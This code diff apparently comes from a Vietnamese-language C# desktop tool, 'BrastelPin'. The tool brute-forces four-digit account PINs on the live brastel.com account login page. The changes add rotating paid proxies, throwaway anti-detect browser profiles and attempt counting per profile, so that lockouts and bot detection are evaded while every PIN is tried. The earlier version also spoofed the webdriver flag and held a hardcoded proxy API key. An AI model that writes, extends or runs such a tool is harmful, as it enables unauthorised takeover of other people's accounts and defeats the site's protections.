@@ -15,9 +15,15 @@ namespace BrastelPin
     public partial class MainForm : Form
     {
         private GUIDataModel _gUIDataModel = null;
+        private OmniLoginProfileManager _omniLoginProfileManager;
+        private ProxyResponse _currentProxy;
+        private DateTime _proxyStartTime;
 
-        private Queue<int> pinQueue = new Queue<int>();
-        private object queueLock = new object();
+
+
+
+        private Queue<int> _pinQueue = new Queue<int>();
+        private object _queueLock = new object();
 
         public MainForm()
         {
@@ -36,16 +42,21 @@ namespace BrastelPin
                 MessageBox.Show("Vui lòng kiểm tra mã PIN");
                 return;
             }
-            //if (string.IsNullOrEmpty(_gUIDataModel.TMProxy))
-            //{
-            //    MessageBox.Show("Vui lòng kiểm tra TMProxy");
-            //    return;
-            //}
+            if (string.IsNullOrEmpty(_gUIDataModel.TMProxy))
+            {
+                MessageBox.Show("Vui lòng kiểm tra TMProxy");
+                return;
+            }
+
+            _omniLoginProfileManager = new OmniLoginProfileManager(_gUIDataModel.OmniloginURL);
+
+
+
 
             // Khởi tạo queue PIN từ 0000 đến 9999
-            pinQueue.Clear();
+            _pinQueue.Clear();
             for (int i = _gUIDataModel.PinFrom; i <= _gUIDataModel.PinTo; i++)
-                pinQueue.Enqueue(i);
+                _pinQueue.Enqueue(i);
 
             rtbLog.AppendText($"[INFO] Bắt đầu kiểm tra mã PIN cho accCode: {_gUIDataModel.AccountCode}\n");
 
@@ -74,42 +85,70 @@ namespace BrastelPin
         }
 
 
-        private void WorkerThread()
+        private async void WorkerThread()
         {
-            int windowWidth = 600;
-            int windowHeight = 600;
+            bool firstGetProxy = true;
+            int countCheck1Profile = 0;
+
 
             while (true)
             {
+                countCheck1Profile = 0;
+
+                if ((firstGetProxy == true)  || ((DateTime.Now - _proxyStartTime).TotalSeconds > 150))
+                {
+                    firstGetProxy = false;
+                    while (true)
+                    {
+                        _currentProxy = await GetProxyAsync();
+                        if (_currentProxy != null)
+                        {
+                            rtbLog.AppendText($"[INFO] Proxy đã lấy: {_currentProxy.data.https}\n");
+                            _proxyStartTime = DateTime.Now;
+                            break;
+                        }
+                        else
+                        {
+                            rtbLog.AppendText("[ERROR] Lấy proxy thất bại. Thử lại sau 30 giây...\n");
+                            await Task.Delay(30000);
+                        }
+                    }
+                }
+
+
                 int pin;
 
-                lock (queueLock)
+                lock (_queueLock)
                 {
-                    if (pinQueue.Count == 0) return;
-                    pin = pinQueue.Dequeue();
+                    if (_pinQueue.Count == 0) return;
+                    pin = _pinQueue.Dequeue();
                 }
 
                 string pinStr = pin.ToString("D4");
 
                 try
                 {
-                    ChromeOptions options = new ChromeOptions();
-
-                    options.AddArgument("--disable-blink-features=AutomationControlled");
-                    options.AddExcludedArgument("enable-automation");
-                    options.AddAdditionalOption("useAutomationExtension", false);
-                    options.AddArgument("--disable-notifications");
-                    options.AddArgument("--log-level=3");
-                    options.AddArgument($"--window-size={windowWidth},{windowHeight}");
-                    //options.AddArgument("--headless");
-                    using (IWebDriver driver = new ChromeDriver(options))
+                    string profileId = await _omniLoginProfileManager.CreateProfileAsync("NewProfile");
+                    if (string.IsNullOrEmpty(profileId))
                     {
-                        driver.Manage().Window.Size = new System.Drawing.Size(windowWidth, windowHeight);
+                        rtbLog.AppendText($"[ERROR] Không tạo được profile.\n");
+                        break;
+                    }
+                    rtbLog.AppendText($"[INFO] Tạo profile thành công: {profileId}");
 
-                        ((IJavaScriptExecutor)driver).ExecuteScript("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})");
+                    int port = await _omniLoginProfileManager.StartProfileAsync(profileId);
+                    if (port == 0)
+                    {
+                        rtbLog.AppendText($"[ERROR] Không khởi động được profile.\n");
+                        break;
+                    }
+                    rtbLog.AppendText($"[INFO] Profile đã chạy trên cổng: {port}");
 
+                    using (ChromeDriver driver = _omniLoginProfileManager.GetChromeDriverFromPort(port))
+                    {
                         driver.Navigate().GoToUrl("https://www.brastel.com/eng/myaccount");
 
+                    CHECK_FUNCTION:
                         // accCodeInput
                         var accCodeInput = driver.FindElement(By.Id("accCodeInput"));
                         for (int i = 0; i < 10; i++)
@@ -150,14 +189,14 @@ namespace BrastelPin
                         var findErrorDisplay = driver.FindElement(By.XPath("//span[contains(normalize-space(), 'Invalid User ID or PIN.')]"));
                         if (findErrorDisplay.Displayed)
                         {
-                            this.Invoke(new Action(() =>
+                            Invoke(new Action(() =>
                             {
                                 rtbLog.AppendText($"[CHECKED] PIN {pinStr} sai.\n");
                             }));
                         }
                         else
                         {
-                            this.Invoke(new Action(() =>
+                            Invoke(new Action(() =>
                             {
                                 rtbLog.AppendText($"[SUCCESS] Đăng nhập thành công với PIN: {pinStr}\n");
                             }));
@@ -165,11 +204,21 @@ namespace BrastelPin
                             break;
                         }
 
+                        countCheck1Profile++;
+                        if (countCheck1Profile < 10)
+                        {
+                            goto CHECK_FUNCTION;
+                        }    
+
                     }
+
+                    await _omniLoginProfileManager.StopProfileAsync(profileId);
+                    await _omniLoginProfileManager.DeleteProfileAsync(profileId);
+
                 }
                 catch (Exception ex)
                 {
-                    this.Invoke(new Action(() =>
+                    Invoke(new Action(() =>
                     {
                         rtbLog.AppendText($"[ERROR] {ex.Message}\n");
                     }));
@@ -178,16 +227,17 @@ namespace BrastelPin
         }
 
 
-        static async Task<ProxyResponse> GetProxyAsync()
+        private async Task<ProxyResponse> GetProxyAsync()
         {
             string url = "https://tmproxy.com/api/proxy/get-new-proxy";
-            string apiKey = "54c8857921a0062eacd0cc6457d7c37f";
+            string apiKey = _gUIDataModel.TMProxy;
 
-            var json = $@"{{
-            ""api_key"": ""{apiKey}"",
-            ""id_location"": 0,
-            ""id_isp"": 0
-        }}";
+            var json =
+                $@"{{
+                    ""api_key"": ""{apiKey}"",
+                    ""id_location"": 0,
+                    ""id_isp"": 0
+                }}";
 
             using (HttpClient client = new HttpClient())
             {
@@ -225,6 +275,17 @@ namespace BrastelPin
             txtPinFrom.Text = _gUIDataModel.PinFrom.ToString();
             txtPinTo.Text = _gUIDataModel.PinTo.ToString();
             txtTMProxy.Text = _gUIDataModel.TMProxy;
+            txtOmniloginURL.Text = _gUIDataModel.OmniloginURL;
+
+
+
+            txtAccountCode.TextChanged += new EventHandler(TextBoxTextChanged);
+            txtPinFrom.TextChanged += new EventHandler(TextBoxTextChanged);
+            txtTMProxy.TextChanged += new EventHandler(TextBoxTextChanged);
+            txtPinTo.TextChanged += new EventHandler(TextBoxTextChanged);
+            txtOmniloginURL.TextChanged += new EventHandler(TextBoxTextChanged);
+
+            _proxyStartTime = DateTime.Now;
         }
 
         private void rtbLog_TextChanged(object sender, EventArgs e)
@@ -233,7 +294,7 @@ namespace BrastelPin
             rtbLog.ScrollToCaret();
         }
 
-        private void UpdateGUIDataModel()
+        private void TextBoxTextChanged(object sender, EventArgs e)
         {
             try
             {
@@ -241,6 +302,7 @@ namespace BrastelPin
                 _gUIDataModel.PinFrom = int.Parse(txtPinFrom.Text);
                 _gUIDataModel.PinTo = int.Parse(txtPinTo.Text);
                 _gUIDataModel.TMProxy = txtTMProxy.Text;
+                _gUIDataModel.OmniloginURL = txtOmniloginURL.Text;
                 _gUIDataModel.SaveToFile();
             }
             catch
@@ -249,31 +311,12 @@ namespace BrastelPin
             }
         }
 
-        private void txtAccountCode_TextChanged(object sender, EventArgs e)
-        {
-            UpdateGUIDataModel();
-        }
-
-        private void txtPinFrom_TextChanged(object sender, EventArgs e)
-        {
-
-            UpdateGUIDataModel();
-        }
-
-        private void txtPinTo_TextChanged(object sender, EventArgs e)
-        {
-            UpdateGUIDataModel();
-        }
-
-        private void txtTMProxy_TextChanged(object sender, EventArgs e)
-        {
-            UpdateGUIDataModel();
-        }
-
-        private void txtPinFrom_KeyPress(object sender, KeyPressEventArgs e)
+        private void TextBoxPinKeyPress(object sender, KeyPressEventArgs e)
         {
             if (char.IsControl(e.KeyChar))
+            {
                 return;
+            }
 
             if (!char.IsDigit(e.KeyChar))
             {
@@ -288,33 +331,9 @@ namespace BrastelPin
             if (int.TryParse(newText, out int value))
             {
                 if (value > 9999)
+                {
                     e.Handled = true;
-            }
-            else
-            {
-                e.Handled = true;
-            }
-        }
-
-        private void txtPinTo_KeyPress(object sender, KeyPressEventArgs e)
-        {
-            if (char.IsControl(e.KeyChar))
-                return;
-
-            if (!char.IsDigit(e.KeyChar))
-            {
-                e.Handled = true;
-                return;
-            }
-
-            TextBox tb = sender as TextBox;
-
-            string newText = tb.Text.Insert(tb.SelectionStart, e.KeyChar.ToString());
-
-            if (int.TryParse(newText, out int value))
-            {
-                if (value > 9999)
-                    e.Handled = true;
+                }
             }
             else
             {
